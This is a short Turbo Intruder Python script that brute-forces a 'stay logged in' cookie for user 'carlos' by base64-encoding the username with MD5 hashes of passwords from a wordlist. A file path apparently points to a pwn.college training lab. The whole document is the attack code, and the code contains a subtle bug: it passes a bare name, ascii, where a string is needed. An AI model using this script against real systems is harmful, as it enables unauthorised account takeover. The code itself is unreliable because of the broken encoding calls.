# a turbo intruder python script
import base64,hashlib


def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=2,
                           requestsPerConnection=1,
                           pipeline=False
                           )

    for word in open('/home/kali/shares/pwn.college/web-security/authentication/passwords'):
        stripped = word.rstrip()
        encoded_cookie = base64.b64encode('carlos:'.encode(ascii)
                                          + hashlib.md5(stripped.encode('ascii')).hexdigest().encode(ascii)).decode(ascii)
        engine.queue(target.req, encoded_cookie)


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.status != 404:
        table.add(req)

